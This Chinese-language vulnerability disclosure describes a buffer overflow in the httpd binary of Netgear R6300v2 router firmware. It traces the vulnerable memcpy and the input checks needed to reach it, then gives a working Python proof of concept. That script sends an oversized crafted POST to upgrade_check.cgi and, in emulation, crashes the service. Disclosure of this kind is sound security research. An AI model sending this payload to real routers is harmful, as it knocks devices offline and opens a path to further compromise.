---

# 基本信息

---

供应商：Netgear

产品：R6300v2

固件版本：R6300v2-V1.0.4.8_10.0.77及以前版本

类型：缓冲区溢出漏洞

# 漏洞描述

---

R6300v2固件版本的二进制文件中存在缓冲区溢出漏洞，漏洞位置位于/usr/sbin/httpd文件中的sub_18334函数(R6300v2-V1.0.4.8_10.0.77版本)，`memcpy(s, src, v2)`将从`src`开始的连续`v2`字节的数据复制到以`s`为起始地址的内存区域中时，会导致目标内存区域（`s`）的大小不足以容纳源内存区域（`src`）的数据，这是因为v2的值是从`src`指针指向的内存中读取连续的四个字节，将它们按照特定的字节顺序（根据索引值）组合成一个32位整数，该值可能会大于变量s的内存长度，从而导致缓冲区溢出，相关信息如下图所示。

在此前，需要绕过`strcmp((const char *)src, "*#$^")`的判断，`src` 必须是`*#$^`，则可以在后面加上`0x00`字符以造成截断。

![image.png](Netgear+R6300v2+路由器缓冲区溢出漏洞+f72ca2e3-dbd3-407a-9564-7f0b20614239/image.png)

经过IDA的交叉引用知道，函数sub_12CC8中调用了函数sub_18334，其中变量v77为传入的实参，通过分析判断条件可知，变量s1需要满足含有`'name="mtenFWUpload"\r\n\r\n'`字符串，然后将该字符串后面的数据作为sub_18334函数的参数。

同时，要想程序执行到该位置，则变量`v117`必须为1，否则会跳出循序，但v117的值在713行被赋值为了0，如下图所示。

![image.png](Netgear+R6300v2+路由器缓冲区溢出漏洞+f72ca2e3-dbd3-407a-9564-7f0b20614239/image 1.png)

![image.png](Netgear+R6300v2+路由器缓冲区溢出漏洞+f72ca2e3-dbd3-407a-9564-7f0b20614239/image 2.png)

往下观察程序可以发现，需使得http请求中含有`upgrade_check.cgi`字符才能够回到原来的while循环。

![image.png](Netgear+R6300v2+路由器缓冲区溢出漏洞+f72ca2e3-dbd3-407a-9564-7f0b20614239/image 3.png)

但为了到达该地方，又要满足一定的条件，即达到LABEL_272，如下图所示。

![image.png](Netgear+R6300v2+路由器缓冲区溢出漏洞+f72ca2e3-dbd3-407a-9564-7f0b20614239/image 4.png)

# 漏洞验证

---

构造的poc程序如下

```Python
import requests

data1 = "*#$^"
data1 += "\x00\xFF\xFF\xFF"
data1 = data1.ljust(0xFFFF, 'A')


payload = ''
payload += 'POST /upgrade_check.cgi HTTP/1.1\r\n'
payload += 'Host: 192.168.1.1\r\n'
payload += 'Content-Disposition: AAAA\r\n'
payload += 'Content-Length: {}\r\n'.format(len(data1) + 1)
payload += 'Content-Type: application/octet-stream\r\n'
payload += 'name="mtenFWUpload"\r\n'
payload += '\r\n'
payload += data1

headers = {'Content-Length': str(len(payload))}

url = 'http://192.168.1.1:80/upgrade_check.cgi'
response = requests.post(url, headers=headers, data=payload)

print(response.text)
```

为了验证漏洞的存在，使用**FirmAE**对固件进行模拟，如下所示，服务可以成功启动

![image.png](Netgear+R6300v2+路由器缓冲区溢出漏洞+f72ca2e3-dbd3-407a-9564-7f0b20614239/image 5.png)

运行poc脚本，刷新页面，发现服务崩溃

![image.png](Netgear+R6300v2+路由器缓冲区溢出漏洞+f72ca2e3-dbd3-407a-9564-7f0b20614239/image 6.png)

[英文版本](Netgear+R6300v2+%E8%B7%AF%E7%94%B1%E5%99%A8%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E+f72ca2e3-dbd3-407a-9564-7f0b20614239/%E8%8B%B1%E6%96%87%E7%89%88%E6%9C%AC%2029b2f1c3-6066-41bc-844c-074f4447fc93.md)

